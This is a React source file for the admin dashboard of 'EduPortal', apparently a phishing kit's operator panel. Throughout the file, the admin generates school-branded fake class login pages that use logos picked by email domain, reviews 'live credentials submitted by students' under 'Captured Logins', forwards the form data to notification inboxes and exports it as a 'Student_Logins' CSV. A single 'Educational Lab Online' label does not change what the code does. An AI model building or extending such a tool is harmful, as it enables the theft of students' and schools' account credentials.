import React, { useState } from 'react';
import { usePortal } from '../../context/PortalContext';
import { 
  PlusSquare, 
  Shield, 
  Settings, 
  LogOut, 
  Inbox, 
  Mail, 
  Layers, 
  Search, 
  Filter, 
  Download, 
  Eye, 
  CheckCircle, 
  Clock, 
  AlertTriangle, 
  Trash2, 
  GraduationCap,
  ExternalLink,
  Bell,
  Check,
  Building2,
  FileSpreadsheet
} from 'lucide-react';
import EmailSettings from './EmailSettings';
import ClassGenerator from './ClassGenerator';
import SubmissionModal from './SubmissionModal';
import SchoolManager from './SchoolManager';

export default function AdminDashboard() {
  const { 
    submissions, 
    classes, 
    schools,
    notificationEmails, 
    setCurrentView,
    adminLogout,
    showToast 
  } = usePortal();

  // Active Sidebar Navigation Tab: 'generator' | 'schools' | 'data' | 'settings'
  const [activeTab, setActiveTab] = useState('generator');
  
  // Responses filtering & search
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedClassFilter, setSelectedClassFilter] = useState('ALL');
  const [statusFilter, setStatusFilter] = useState('ALL');
  const [inspectingSubmission, setInspectingSubmission] = useState(null);

  // Statistics calculation
  const totalSubmissions = submissions.length;
  const pendingCount = submissions.filter(s => s.status === 'Pending').length;
  const activeClassCount = classes.length;
  const totalSchoolsCount = schools.length;

  // Filter logic for Captured Data
  const filteredSubmissions = submissions.filter(sub => {
    const reg = (sub.regNo || sub.studentRegNo || sub.fullName || '').toLowerCase();
    const email = (sub.schoolEmail || sub.email || sub.studentEmail || '').toLowerCase();
    const school = (sub.schoolName || '').toLowerCase();
    const subId = (sub.id || '').toLowerCase();
    const q = searchQuery.toLowerCase().trim();

    const matchesSearch = !q || reg.includes(q) || email.includes(q) || school.includes(q) || subId.includes(q);
    const matchesClass = selectedClassFilter === 'ALL' || sub.classCode === selectedClassFilter;
    const matchesStatus = statusFilter === 'ALL' || sub.status === statusFilter;

    return matchesSearch && matchesClass && matchesStatus;
  });

  // Export submissions to CSV
  const handleExportCSV = () => {
    if (submissions.length === 0) {
      showToast('No submissions available to export.', 'info');
      return;
    }

    const headers = [
      'Submission ID',
      'Class Code',
      'Class Name',
      'Institution Name',
      'Registration No',
      'School Email',
      'Status',
      'Submitted At',
      'Notified Emails'
    ];

    const rows = submissions.map(s => [
      `"${s.id}"`,
      `"${s.classCode}"`,
      `"${s.className}"`,
      `"${s.schoolName || ''}"`,
      `"${s.regNo}"`,
      `"${s.schoolEmail}"`,
      `"${s.status || 'Captured'}"`,
      `"${s.submittedAt}"`,
      `"${(s.sentToEmails || []).join('; ')}"`
    ]);

    const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map(r => r.join(','))].join('\n');
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement('a');
    link.setAttribute('href', encodedUri);
    link.setAttribute('download', `Student_Logins_${new Date().toISOString().slice(0, 10)}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    showToast('Student submissions exported to CSV!', 'success');
  };

  const getStatusBadge = (status) => {
    switch (status) {
      case 'Reviewed':
      case 'Verified':
        return <span className="inline-flex items-center gap-1 text-[11px] font-bold px-2.5 py-0.5 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/30"><CheckCircle className="w-3 h-3" /> {status}</span>;
      case 'Pending':
        return <span className="inline-flex items-center gap-1 text-[11px] font-bold px-2.5 py-0.5 rounded-full bg-amber-500/10 text-amber-400 border border-amber-500/30"><Clock className="w-3 h-3" /> Pending</span>;
      default:
        return <span className="text-[11px] font-bold px-2.5 py-0.5 rounded-full bg-indigo-500/10 text-indigo-300 border border-indigo-500/30">{status || 'Captured'}</span>;
    }
  };

  return (
    <div className="min-h-screen bg-[#070A11] text-slate-100 flex flex-col md:flex-row font-sans">
      
      {/* LEFT SIDEBAR (matching Image 1) */}
      <aside className="w-full md:w-64 bg-[#0B0F19] border-r border-[#1B2436] flex flex-col justify-between p-4 flex-shrink-0">
        
        {/* Navigation Items */}
        <div className="space-y-6">
          
          {/* Logo / Brand Header */}
          <div className="px-2 pt-2 pb-1 flex items-center justify-between">
            <div className="flex items-center gap-2.5">
              <div className="w-8 h-8 rounded-xl bg-indigo-600 flex items-center justify-center text-white shadow-md shadow-indigo-500/30">
                <GraduationCap className="w-5 h-5" />
              </div>
              <span className="font-bold text-white text-base tracking-tight">EduPortal</span>
            </div>
            <span className="text-[10px] uppercase font-mono font-bold bg-[#161F33] text-indigo-300 border border-[#243048] px-2 py-0.5 rounded-md">
              Admin
            </span>
          </div>

          {/* Navigation Links */}
          <nav className="space-y-1.5">
            
            {/* 1. Page Generator */}
            <button
              onClick={() => setActiveTab('generator')}
              className={`w-full flex items-center gap-3 px-3.5 py-2.5 rounded-xl text-sm font-semibold transition-all text-left ${
                activeTab === 'generator'
                  ? 'bg-[#1E2238] border border-indigo-500/50 text-white shadow-lg shadow-indigo-500/10'
                  : 'text-slate-400 hover:text-white hover:bg-[#121826]'
              }`}
            >
              <PlusSquare className={`w-5 h-5 ${activeTab === 'generator' ? 'text-indigo-400' : 'text-slate-400'}`} />
              <span>Page Generator</span>
            </button>

            {/* 2. School Profiles & Logos (User Request) */}
            <button
              onClick={() => setActiveTab('schools')}
              className={`w-full flex items-center justify-between px-3.5 py-2.5 rounded-xl text-sm font-semibold transition-all text-left ${
                activeTab === 'schools'
                  ? 'bg-[#1E2238] border border-indigo-500/50 text-white shadow-lg shadow-indigo-500/10'
                  : 'text-slate-400 hover:text-white hover:bg-[#121826]'
              }`}
            >
              <div className="flex items-center gap-3">
                <Building2 className={`w-5 h-5 ${activeTab === 'schools' ? 'text-indigo-400' : 'text-slate-400'}`} />
                <span>Schools & Logos</span>
              </div>
              <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-blue-500/20 text-blue-300 border border-blue-500/30">
                {totalSchoolsCount}
              </span>
            </button>

            {/* 3. Captured Data */}
            <button
              onClick={() => setActiveTab('data')}
              className={`w-full flex items-center justify-between px-3.5 py-2.5 rounded-xl text-sm font-semibold transition-all text-left ${
                activeTab === 'data'
                  ? 'bg-[#1E2238] border border-indigo-500/50 text-white shadow-lg shadow-indigo-500/10'
                  : 'text-slate-400 hover:text-white hover:bg-[#121826]'
              }`}
            >
              <div className="flex items-center gap-3">
                <Shield className={`w-5 h-5 ${activeTab === 'data' ? 'text-indigo-400' : 'text-slate-400'}`} />
                <span>Captured Data</span>
              </div>
              {totalSubmissions > 0 && (
                <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-indigo-500/20 text-indigo-300 border border-indigo-500/30">
                  {totalSubmissions}
                </span>
              )}
            </button>

            {/* 4. Settings */}
            <button
              onClick={() => setActiveTab('settings')}
              className={`w-full flex items-center gap-3 px-3.5 py-2.5 rounded-xl text-sm font-semibold transition-all text-left ${
                activeTab === 'settings'
                  ? 'bg-[#1E2238] border border-indigo-500/50 text-white shadow-lg shadow-indigo-500/10'
                  : 'text-slate-400 hover:text-white hover:bg-[#121826]'
              }`}
            >
              <Settings className={`w-5 h-5 ${activeTab === 'settings' ? 'text-indigo-400' : 'text-slate-400'}`} />
              <span>Settings</span>
            </button>
          </nav>

        </div>

        {/* Sidebar Footer Area (matching Image 1) */}
        <div className="space-y-2.5 pt-6 border-t border-[#1B2436]/60">
          
          {/* Status Pill */}
          <div className="flex items-center gap-2 px-3 py-2 rounded-xl bg-[#081717] border border-[#0d3434] text-xs font-medium text-emerald-400">
            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
            <span>Educational Lab Online</span>
          </div>

          {/* Open Student View Button */}
          <button
            onClick={() => setCurrentView('student')}
            className="w-full flex items-center justify-center gap-2 px-3 py-2 rounded-xl bg-[#141B2D] hover:bg-[#1A233A] border border-[#1E293B] text-slate-300 hover:text-white text-xs font-semibold transition-colors cursor-pointer"
          >
            <GraduationCap className="w-4 h-4 text-indigo-400" />
            <span>Open Student View</span>
          </button>

          {/* Sign Out Button */}
          <button
            onClick={adminLogout}
            className="w-full flex items-center justify-center gap-2 px-3 py-2 rounded-xl border border-[#1E293B] hover:bg-[#141B2D] text-slate-400 hover:text-rose-300 text-xs font-semibold transition-colors cursor-pointer"
          >
            <LogOut className="w-4 h-4" />
            <span>Sign Out</span>
          </button>

        </div>

      </aside>

      {/* RIGHT MAIN CONTENT AREA */}
      <main className="flex-1 p-5 sm:p-8 lg:p-10 overflow-y-auto">
        <div className="max-w-6xl mx-auto space-y-7">
          
          {/* Top Header & Session Pill */}
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-2">
            <div>
              <h1 className="text-2xl sm:text-3xl font-bold tracking-tight text-white">
                {activeTab === 'generator' && 'Page Generator'}
                {activeTab === 'schools' && 'Schools & Logo Profiles'}
                {activeTab === 'data' && 'Captured Student Submissions'}
                {activeTab === 'settings' && 'System & Notification Settings'}
              </h1>
              <p className="text-xs sm:text-sm text-slate-400 mt-1">
                {activeTab === 'generator' && 'Generate high-fidelity class login landing pages for educational submissions'}
                {activeTab === 'schools' && 'Upload and customize school logos that pop up automatically based on email domain'}
                {activeTab === 'data' && 'Review live credentials submitted by students across all active class portals'}
                {activeTab === 'settings' && 'Configure admin notification email channels to receive student form data'}
              </p>
            </div>

            <div className="flex items-center gap-3">
              <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-medium bg-[#111726] border border-[#1E293B] text-slate-300">
                <span className="w-1.5 h-1.5 rounded-full bg-indigo-400"></span>
                <span>Multi-School Detection Active</span>
              </span>
            </div>
          </div>

          {/* TOP STATS KPI CARDS (Image 3 style) */}
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
            
            {/* Stat Card 1: Active Class Portals */}
            <div className="bg-[#111726] border border-[#1E293B] rounded-2xl p-4 sm:p-5 shadow-lg flex items-center justify-between">
              <div>
                <span className="text-xs font-medium text-slate-400 block mb-1">
                  Class Portals
                </span>
                <span className="text-2xl sm:text-3xl font-black text-white tracking-tight">
                  {activeClassCount}
                </span>
              </div>
              <div className="w-10 h-10 rounded-xl bg-indigo-500/10 border border-indigo-500/30 flex items-center justify-center text-indigo-400">
                <Layers className="w-5 h-5" />
              </div>
            </div>

            {/* Stat Card 2: Registered Schools & Logos */}
            <div 
              onClick={() => setActiveTab('schools')}
              className="bg-[#111726] border border-[#1E293B] rounded-2xl p-4 sm:p-5 shadow-lg flex items-center justify-between cursor-pointer hover:border-blue-500/50 transition-colors"
            >
              <div>
                <span className="text-xs font-medium text-slate-400 block mb-1">
                  Active Schools
                </span>
                <span className="text-2xl sm:text-3xl font-black text-blue-400 tracking-tight">
                  {totalSchoolsCount}
                </span>
              </div>
              <div className="w-10 h-10 rounded-xl bg-blue-500/10 border border-blue-500/30 flex items-center justify-center text-blue-400">
                <Building2 className="w-5 h-5" />
              </div>
            </div>

            {/* Stat Card 3: Captured Submissions */}
            <div 
              onClick={() => setActiveTab('data')}
              className="bg-[#111726] border border-[#1E293B] rounded-2xl p-4 sm:p-5 shadow-lg flex items-center justify-between cursor-pointer hover:border-purple-500/50 transition-colors"
            >
              <div>
                <span className="text-xs font-medium text-slate-400 block mb-1">
                  Captured Logins
                </span>
                <span className="text-2xl sm:text-3xl font-black text-white tracking-tight">
                  {totalSubmissions}
                </span>
              </div>
              <div className="w-10 h-10 rounded-xl bg-purple-500/10 border border-purple-500/30 flex items-center justify-center text-purple-400">
                <Shield className="w-5 h-5" />
              </div>
            </div>

            {/* Stat Card 4: Unreviewed Activity */}
            <div className="bg-[#111726] border border-[#1E293B] rounded-2xl p-4 sm:p-5 shadow-lg flex items-center justify-between">
              <div>
                <span className="text-xs font-medium text-slate-400 block mb-1">
                  In Review
                </span>
                <span className="text-2xl sm:text-3xl font-black text-emerald-400 tracking-tight">
                  {pendingCount}
                </span>
              </div>
              <div className="w-10 h-10 rounded-xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400">
                <Bell className="w-5 h-5" />
              </div>
            </div>

          </div>

          {/* TAB 1: PAGE GENERATOR */}
          {activeTab === 'generator' && (
            <ClassGenerator />
          )}

          {/* TAB 2: SCHOOLS & LOGOS MANAGEMENT (User Request) */}
          {activeTab === 'schools' && (
            <SchoolManager />
          )}

          {/* TAB 3: CAPTURED DATA */}
          {activeTab === 'data' && (
            <div className="space-y-6">
              
              {/* Toolbar */}
              <div className="bg-[#111726] border border-[#1E293B] p-4 rounded-2xl shadow-sm flex flex-col md:flex-row gap-3 items-stretch md:items-center justify-between">
                <div className="relative flex-1">
                  <Search className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-500" />
                  <input
                    type="text"
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    placeholder="Search by student name, Reg No, school, or email..."
                    className="w-full pl-10 pr-4 py-2 text-xs sm:text-sm rounded-xl bg-[#0B0F19] border border-[#1E293B] text-white focus:border-indigo-500 outline-hidden"
                  />
                </div>

                <div className="flex items-center gap-2">
                  <select
                    value={selectedClassFilter}
                    onChange={(e) => setSelectedClassFilter(e.target.value)}
                    className="px-3 py-2 text-xs rounded-xl bg-[#0B0F19] border border-[#1E293B] text-white outline-hidden cursor-pointer"
                  >
                    <option value="ALL">All Classes ({classes.length})</option>
                    {classes.map(c => (
                      <option key={c.id} value={c.code}>{c.code} - {c.name}</option>
                    ))}
                  </select>

                  <select
                    value={statusFilter}
                    onChange={(e) => setStatusFilter(e.target.value)}
                    className="px-3 py-2 text-xs rounded-xl bg-[#0B0F19] border border-[#1E293B] text-white outline-hidden cursor-pointer"
                  >
                    <option value="ALL">All Status</option>
                    <option value="Captured">Captured</option>
                    <option value="Verified">Verified</option>
                  </select>

                  <button
                    onClick={handleExportCSV}
                    className="inline-flex items-center gap-1.5 px-3 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white font-semibold text-xs transition-colors cursor-pointer"
                  >
                    <Download className="w-3.5 h-3.5" />
                    <span>CSV</span>
                  </button>
                </div>
              </div>

              {/* Data Table */}
              <div className="bg-[#111726] border border-[#1E293B] rounded-2xl shadow-sm overflow-hidden">
                {filteredSubmissions.length === 0 ? (
                  <div className="text-center py-16 text-slate-500">
                    <Shield className="w-10 h-10 mx-auto mb-2 opacity-40 text-slate-500" />
                    <p className="text-sm font-semibold text-slate-300">No captured records found</p>
                    <p className="text-xs text-slate-500 mt-0.5">When students submit class forms, their responses will appear here.</p>
                  </div>
                ) : (
                  <div className="overflow-x-auto">
                    <table className="w-full text-left text-xs">
                      <thead className="bg-[#0B0F19] border-b border-[#1E293B] text-slate-400 uppercase font-semibold">
                        <tr>
                          <th className="py-3.5 px-4">Student Reg No</th>
                          <th className="py-3.5 px-4">School Email</th>
                          <th className="py-3.5 px-4">Detected Institution</th>
                          <th className="py-3.5 px-4">Target Class</th>
                          <th className="py-3.5 px-4">Notified Inboxes</th>
                          <th className="py-3.5 px-4">Status</th>
                          <th className="py-3.5 px-4">Captured At</th>
                          <th className="py-3.5 px-4 text-right">Action</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-[#1E293B]">
                        {filteredSubmissions.map((sub) => (
                          <tr
                            key={sub.id}
                            onClick={() => setInspectingSubmission(sub)}
                            className="hover:bg-[#141B2D] transition-colors cursor-pointer"
                          >
                            <td className="py-3 px-4">
                              <span className="font-mono font-bold text-indigo-400 text-xs sm:text-sm bg-[#161F33] px-2.5 py-1 rounded-lg border border-[#243048] inline-block">
                                {sub.regNo || sub.studentRegNo || sub.fullName || '—'}
                              </span>
                            </td>

                            <td className="py-3 px-4">
                              <span className="font-mono text-slate-200 text-xs font-medium">
                                {sub.schoolEmail || sub.email || sub.studentEmail || '—'}
                              </span>
                            </td>

                            <td className="py-3 px-4">
                              <div className="font-semibold text-white truncate max-w-[180px]">
                                {sub.schoolName || 'General School'}
                              </div>
                            </td>

                            <td className="py-3 px-4">
                              <span className="font-mono font-bold px-2 py-0.5 rounded-md bg-[#0B0F19] text-indigo-300 border border-[#1E293B]">
                                {sub.classCode || 'GEN'}
                              </span>
                            </td>

                            <td className="py-3 px-4">
                              <div className="flex items-center gap-1.5 text-slate-300">
                                <Mail className="w-3.5 h-3.5 text-indigo-400" />
                                <span>{sub.sentToEmails?.length || 0} inbox(es)</span>
                              </div>
                            </td>

                            <td className="py-3 px-4">
                              {getStatusBadge(sub.status)}
                            </td>

                            <td className="py-3 px-4 text-slate-400 whitespace-nowrap font-mono text-[11px]">
                              {new Date(sub.submittedAt).toLocaleTimeString()} ({new Date(sub.submittedAt).toLocaleDateString()})
                            </td>

                            <td className="py-3 px-4 text-right">
                              <button
                                onClick={(e) => {
                                  e.stopPropagation();
                                  setInspectingSubmission(sub);
                                }}
                                className="p-1.5 rounded-lg text-slate-400 hover:text-indigo-400 hover:bg-indigo-500/10 transition-colors"
                              >
                                <Eye className="w-4 h-4" />
                              </button>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                )}
              </div>

            </div>
          )}

          {/* TAB 4: SETTINGS */}
          {activeTab === 'settings' && (
            <EmailSettings />
          )}

        </div>
      </main>

      {/* Submission Details Modal */}
      {inspectingSubmission && (
        <SubmissionModal
          submission={inspectingSubmission}
          onClose={() => setInspectingSubmission(null)}
        />
      )}

    </div>
  );
}
